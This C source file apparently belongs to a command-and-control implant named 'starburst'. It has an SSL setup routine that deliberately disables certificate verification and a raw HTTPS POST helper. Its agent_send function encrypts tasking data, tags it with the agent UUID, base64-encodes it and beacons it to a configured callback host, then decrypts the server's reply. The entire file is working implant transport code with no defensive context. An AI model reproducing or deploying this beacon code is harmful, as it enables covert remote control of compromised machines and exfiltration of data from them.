#include "starburst.h"

int ssl_init(void) {
#if OPENSSL_VERSION_NUMBER >= 0x10100000L
    OPENSSL_init_ssl(0, NULL);
#else
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
#endif

    const SSL_METHOD *method = TLS_client_method();
    if (!method) return -1;

    g_state.ssl_ctx = SSL_CTX_new(method);
    if (!g_state.ssl_ctx) return -1;

    SSL_CTX_set_verify(g_state.ssl_ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(g_state.ssl_ctx, TLS1_2_VERSION);
    return 0;
}

uint8_t *https_post(const char *host, int port, const char *uri,
                     const uint8_t *body, uint32_t body_len,
                     uint32_t *resp_len) {
    *resp_len = 0;

    DBG("https_post: resolving %s:%d", host, port);

    /* use inet_pton first to avoid getaddrinfo NSS crash in static binaries */
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        /* not a raw IP — fall back to getaddrinfo */
        struct addrinfo hints = {0}, *res = NULL;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        char port_str[8];
        snprintf(port_str, sizeof(port_str), "%d", port);

        DBG("https_post: getaddrinfo for %s", host);
        if (getaddrinfo(host, port_str, &hints, &res) != 0) {
            DBG("https_post: getaddrinfo failed");
            return NULL;
        }
        memcpy(&addr, res->ai_addr, sizeof(addr));
        freeaddrinfo(res);
    }

    DBG("https_post: connecting");
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;

    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        DBG("https_post: connect failed: %s", strerror(errno));
        close(sock);
        return NULL;
    }

    DBG("https_post: SSL handshake");
    SSL *ssl = SSL_new(g_state.ssl_ctx);
    if (!ssl) { DBG("https_post: SSL_new failed"); close(sock); return NULL; }
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        DBG("https_post: SSL_connect failed");
        SSL_free(ssl);
        close(sock);
        return NULL;
    }

    char header[1024];
    int hlen = snprintf(header, sizeof(header),
        "POST /%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %u\r\n"
        "Connection: close\r\n"
        "\r\n",
        uri, host, port, body_len);

    SSL_write(ssl, header, hlen);
    SSL_write(ssl, body, (int)body_len);

    uint32_t buf_cap = 65536;
    uint8_t *buf = (uint8_t *)malloc(buf_cap);
    uint32_t buf_len = 0;
    int n;
    while ((n = SSL_read(ssl, buf + buf_len, (int)(buf_cap - buf_len))) > 0) {
        buf_len += (uint32_t)n;
        if (buf_len + 4096 > buf_cap) {
            buf_cap *= 2;
            buf = (uint8_t *)realloc(buf, buf_cap);
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);

    uint8_t *body_start = NULL;
    for (uint32_t i = 0; i + 3 < buf_len; i++) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            body_start = buf + i + 4;
            break;
        }
    }
    if (!body_start) { free(buf); return NULL; }

    uint32_t body_size = buf_len - (uint32_t)(body_start - buf);
    uint8_t *result = (uint8_t *)malloc(body_size);
    memcpy(result, body_start, body_size);
    *resp_len = body_size;
    free(buf);
    return result;
}

uint8_t *agent_send(const uint8_t *tlv, uint32_t tlv_len, uint32_t *out_len) {
    *out_len = 0;

    uint32_t enc_len;
    uint8_t *enc = aes_encrypt(tlv, tlv_len, &enc_len);
    if (!enc) return NULL;

    uint32_t uuid_len = (uint32_t)strlen(g_state.uuid);
    uint32_t raw_len = uuid_len + enc_len;
    uint8_t *raw = (uint8_t *)malloc(raw_len);
    memcpy(raw, g_state.uuid, uuid_len);
    memcpy(raw + uuid_len, enc, enc_len);
    free(enc);

    size_t b64_len;
    char *b64 = b64_encode(raw, raw_len, &b64_len);
    free(raw);

    uint32_t resp_b64_len;
    uint8_t *resp_b64 = https_post(g_state.callback_host, g_state.callback_port,
                                    g_state.post_uri, (uint8_t *)b64, (uint32_t)b64_len,
                                    &resp_b64_len);
    free(b64);
    if (!resp_b64 || resp_b64_len == 0) {
        free(resp_b64);
        return NULL;
    }

    size_t resp_raw_len;
    uint8_t *resp_raw = b64_decode((char *)resp_b64, resp_b64_len, &resp_raw_len);
    free(resp_b64);

    if (resp_raw_len <= 36) { free(resp_raw); return NULL; }

    uint32_t dec_len;
    uint8_t *dec = aes_decrypt(resp_raw + 36, (uint32_t)(resp_raw_len - 36), &dec_len);
    free(resp_raw);

    if (!dec) return NULL;

    *out_len = dec_len;
    return dec;
}
